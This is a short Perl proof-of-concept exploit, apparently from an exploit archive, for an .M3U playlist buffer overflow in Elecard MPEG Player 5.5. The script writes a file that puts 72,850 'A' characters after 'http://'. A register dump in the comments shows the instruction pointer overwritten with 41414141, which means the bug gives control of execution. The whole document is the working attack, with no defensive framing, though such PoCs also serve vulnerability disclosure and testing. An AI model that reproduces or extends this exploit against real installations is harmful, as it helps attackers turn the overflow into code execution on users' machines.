#!/usr/bin/perl -w

########################################################################
#Program  : Elecard MPEG Player                                       
#Version  : 5.5 build 15884.081218                                    
#website  : http://www.elecard.com/download/index.php                   
#Download : http://www.elecard.com/ftp/pub/mpeg/player/EMpgPlayer.zip 
#Type     :  * (.M3U) Buffer Overflow POC                             
########################################################################

#EAX 00000000
#ECX 41414141
#EDX 7C9037D8 ntdll.7C9037D8
#EBX 00000000
#ESP 0012BE40
#EBP 0012BE60
#ESI 00000000
#EDI 00000000
#EIP 41414141
#C 0  ES 0023 32bit 0(FFFFFFFF)
#P 1  CS 001B 32bit 0(FFFFFFFF)
#A 0  SS 0023 32bit 0(FFFFFFFF)
#Z 1  DS 0023 32bit 0(FFFFFFFF)
#S 0  FS 003B 32bit 7FFDF000(FFF)
#T 0  GS 0000 NULL
#D 0
#O 0
#EFL 00210246 (NO,NB,E,BE,NS,PE,GE,LE)
#MM0 0020 0202 0000 001B
#MM1 015A F2BC 8986 2BC0
#MM2 011C 0000 4020 027F
#MM3 0000 0000 804D A735
#MM4 BADB 0D00 BF83 15E6
#MM5 8A1B EAB8 0000 0005
#MM6 0000 0000 0000 0000
#MM7 D1B7 1758 E219 6000




my $file="boom.m3u";


open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE "http://"."A" x 72850;
close($FILE);
print "$file has been created \n";